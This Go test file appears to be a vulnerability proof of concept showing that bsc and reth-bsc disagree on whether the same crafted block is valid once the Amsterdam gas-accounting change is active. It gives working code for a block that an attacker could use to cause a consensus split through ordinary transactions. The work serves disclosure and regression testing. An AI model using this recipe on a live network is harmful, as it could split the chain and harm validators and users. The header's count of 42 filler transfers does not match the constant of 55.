package core

// PROOF OF CONCEPT — BEP-703 Payment Lane gas-basis divergence (bsc vs reth-bsc).
//
// One block, two importers, byte-identical inputs:
//
//   Importer A = bsc with Amsterdam active (EIP-7778): the block gas pool is
//                charged at the PRE-refund PEAK basis (state_transition.go,
//                IsAmsterdam branch: ReturnGas(initialBudget-peakGasUsed)), and
//                the payment-lane inequality is verified against that pool total
//                (state_processor.go: lane.Verify(gp.Used()+system)). VERDICT: REJECT.
//
//   Importer B = reth-bsc semantics: Amsterdam does not exist in reth-bsc (its
//                fork list ends at Jenner), so the pool — and the lane check
//                (executor.rs verify_payment_lane(self.gas_used), fed by
//                tx_gas_used) — stays on the POST-refund RECEIPT basis forever.
//                VERDICT: ACCEPT (and build on it).
//
// The block carries: 2 high-refund general transactions (SSTORE clears over 100
// pre-set storage slots each), 1 payment-lane transfer, and 42 plain general
// transfers. The general side is sized so the receipt-basis total + the idle
// lane quota fits the gas limit while the peak-basis total + the same idle
// quota breaks it. At Amsterdam, bsc Go and reth-bsc therefore disagree on the
// validity of the same bytes: a consensus split reachable by an unauthenticated
// attacker through ordinary mempool transactions (a receipt-basis producer —
// i.e. any honest reth-bsc validator — seals exactly such blocks naturally).
//
// Both importers run under the same ethash.NewFullFaker engine, so no Parlia
// header-level Amsterdam fields are required and the ONLY variable between
// verdict A and verdict B is the gas accounting basis.

import (
        "math/big"
        "testing"

        "github.com/ethereum/go-ethereum/common"
        "github.com/ethereum/go-ethereum/consensus/ethash"
        "github.com/ethereum/go-ethereum/core/paymentlane"
        "github.com/ethereum/go-ethereum/core/rawdb"
        "github.com/ethereum/go-ethereum/core/types"
        "github.com/ethereum/go-ethereum/params"
        "github.com/stretchr/testify/require"
)

const (
        pocGasLimit      = 2_000_000
        pocClearerTxs    = 2       // high-refund SSTORE-clearing txs
        pocClearedSlots  = 100     // storage slots cleared per tx
        pocClearerGasCap = 600_000 // tx gas limit headroom for a clearer
        pocFillerTxs     = 55      // plain zero-value general transfers
)

// pocClearingCode returns runtime bytecode that clears storage slots 0..99
// (PUSH1 0; PUSH2 <slot>; SSTORE; per slot, then STOP). Each clear on a cold,
// non-zero slot costs 2100 (cold) + 2900 (clear) gas and refunds 4800, capped
// by EIP-3529 at used/5 — so each clearer transaction books ~523.6k gas at
// peak but only ~418.9k on the receipt basis: a ~20% spread, the maximum the
// refund quotient allows.
func pocClearingCode() []byte {
        code := make([]byte, 0, pocClearedSlots*6+1)
        for i := 0; i < pocClearedSlots; i++ {
                code = append(code, 0x60, 0x00) // PUSH1 0 (new value)
                code = append(code, 0x61, byte(i>>8), byte(i&0xff)) // PUSH2 <slot>
                code = append(code, 0x55)       // SSTORE
        }
        return append(code, 0x00) // STOP
}

// pocClearingStorage pre-sets slots 0..99 to 1 so each SSTORE is a
// non-zero-to-zero clear and earns the 4800-gas refund.
func pocClearingStorage() map[common.Hash]common.Hash {
        storage := make(map[common.Hash]common.Hash, pocClearedSlots)
        one := common.BigToHash(big.NewInt(1))
        for i := 0; i < pocClearedSlots; i++ {
                storage[common.BigToHash(big.NewInt(int64(i)))] = one
        }
        return storage
}

func TestPaymentLaneGasBasisDivergenceAmsterdamPOC(t *testing.T) {
        config, gspec, key := laneGenesis(t, pocGasLimit)

        // The clearer contract sits on an UNLISTED address: zero-value calls to it
        // are GENERAL transactions (only listed destinations and value transfers
        // ride the payment lane).
        clearer := common.Address{0xdd}
        gspec.Alloc[clearer] = types.Account{Code: pocClearingCode(), Storage: pocClearingStorage()}

        // Producer packs with the lane OFF and Amsterdam OFF: the block gas pool is
        // charged at the receipt basis — the only basis reth-bsc ever has.
        // (Amsterdam needs a blobSchedule entry whenever its time is non-nil —
        // shipped configs keep it nil on purpose, see TestBSCAmsterdamIsNotSchedulable;
        // the PoC supplies one locally since it schedules Amsterdam itself.)
        far := ^uint64(0) >> 1
        config.BlobScheduleConfig.Amsterdam = params.DefaultCancunBlobConfig
        *config.JennerTime = far
        config.AmsterdamTime = &far

        signer := types.LatestSigner(config)
        var nonce uint64
        _, blocks, _ := GenerateChainWithGenesis(gspec, ethash.NewFullFaker(), 2, func(i int, b *BlockGen) {
                if i != 1 {
                        return
                }
                for c := 0; c < pocClearerTxs; c++ { // high-refund general txs
                        b.AddTx(key.sign(t, signer, nonce, clearer, common.Big0, pocClearerGasCap, nil))
                        nonce++
                }
                // One payment-lane transaction: a bare value transfer is payment gas.
                b.AddTx(key.sign(t, signer, nonce, common.Address{0xaa}, common.Big1, params.TxGas, nil))
                nonce++
                for f := 0; f < pocFillerTxs; f++ { // plain general transfers
                        b.AddTx(key.sign(t, signer, nonce, common.Address{0xbb}, common.Big0, params.TxGas, nil))
                        nonce++
                }
        })

        receiptTotal := blocks[1].GasUsed()
        quota := paymentlane.Quota(500, pocGasLimit)
        t.Logf("POC BLOCK: gasLimit=%d laneQuota=%d txCount=%d header.GasUsed(receipt-basis total)=%d",
                pocGasLimit, quota, blocks[1].Transactions().Len(), receiptTotal)
        require.LessOrEqual(t, receiptTotal+quota-params.TxGas, uint64(pocGasLimit),
                "receipt-basis accounting must leave room for the idle quota: this is the basis reth-bsc judges on")

        // Importer A — bsc at Amsterdam: lane ON (Jenner), gas pool charged at the
        // pre-refund PEAK per EIP-7778. The identical bytes must be REJECTED.
        // (Amsterdam lands at t=10: the genesis (t=0) stays pre-Amsterdam and the
        // fork ordering Jenner(0) <= Amsterdam(10) holds; the block under test is
        // height 2, t=20, comfortably post-Amsterdam.)
        *config.JennerTime = 0
        amsterdam := uint64(10)
        config.AmsterdamTime = &amsterdam
        chainA, err := NewBlockChain(rawdb.NewMemoryDatabase(), gspec, ethash.NewFullFaker(), DefaultConfig())
        require.NoError(t, err)
        _, errPeak := chainA.InsertChain(blocks)
        chainA.Stop()
        t.Logf("VERDICT A — bsc Go, Amsterdam ON (EIP-7778 refund-exclusive pool => PEAK basis): %v", errPeak)
        require.ErrorIs(t, errPeak, paymentlane.ErrViolated,
                "the same block bytes reth-bsc accepts must violate the lane under bsc's Amsterdam gas accounting")

        // Importer B — reth-bsc semantics: lane ON (Jenner) but Amsterdam absent,
        // so the pool — and with it the lane check — stays on the receipt basis.
        // The identical bytes must be ACCEPTED.
        config.AmsterdamTime = &far
        chainB, err := NewBlockChain(rawdb.NewMemoryDatabase(), gspec, ethash.NewFullFaker(), DefaultConfig())
        require.NoError(t, err)
        inserted, errReceipt := chainB.InsertChain(blocks)
        head := chainB.CurrentBlock().Number.Uint64()
        chainB.Stop()
        t.Logf("VERDICT B — reth-bsc semantics, Amsterdam ABSENT (refund-inclusive pool => RECEIPT basis): inserted=%d head=%d err=%v",
                inserted, head, errReceipt)
        require.NoError(t, errReceipt)
        require.Equal(t, blocks[1].NumberU64(), head, "reth-bsc-semantics importer must accept and build on the block")
}
